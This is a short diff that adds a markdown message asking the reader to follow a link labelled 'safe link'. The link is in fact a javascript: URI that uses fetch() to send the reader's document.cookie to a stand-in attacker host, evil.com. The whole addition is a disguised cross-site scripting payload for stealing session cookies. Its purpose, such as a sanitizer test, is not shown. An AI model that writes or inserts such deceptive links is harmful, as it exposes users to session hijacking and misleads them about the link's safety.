@@ -1,0 +1,3 @@
+Please follow this link:
+[safe link](javascript:fetch('https://evil.com/?c='+document.cookie))
+This will take you to the relevant page.
